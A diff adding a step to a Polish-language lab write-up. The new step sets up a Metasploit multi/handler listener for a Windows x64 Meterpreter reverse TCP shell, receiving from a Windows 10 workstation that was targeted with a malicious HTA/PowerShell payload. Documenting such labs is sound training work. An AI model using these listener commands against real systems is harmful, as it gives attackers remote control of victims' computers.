@@ -29,3 +29,15 @@ Na stacji Kali Linux wygenerowałem złośliwy payload HTA zawierający kod Powe
 ### Krok 2: Konfiguracja nasłuchu
 
 <img width="669" height="539" alt="1" src="https://github.com/user-attachments/assets/e29447ea-0f48-4b52-b5c8-6e89705d72ef" />
+
+Skonfigurowano moduł multi/handler w konsoli Metasploit, aby oczekiwać na połączenie zwrotne od stacji roboczej Windows 10. 
+
+Komendy Kali: 
+```
+sudo msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.107
+set LPORT 4444
+exploit
+```
